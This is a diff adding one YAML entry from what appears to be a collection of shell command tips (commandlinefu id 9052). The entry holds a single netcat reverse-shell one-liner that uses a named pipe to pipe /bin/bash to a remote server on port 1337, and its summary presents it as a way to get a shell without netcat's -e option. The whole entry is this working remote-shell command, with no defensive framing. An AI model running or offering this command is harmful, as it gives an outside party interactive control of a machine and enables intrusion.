@@ -1,0 +1,8 @@
+commandlinefu_id: 9052
+translator:
+  weibo: ''
+hide: true
+command: |-
+  mknod backpipe p && nc remote_server 1337 0<backpipe | /bin/bash 1>backpipe
+summary: |-
+  execute a shell with netcat without -e
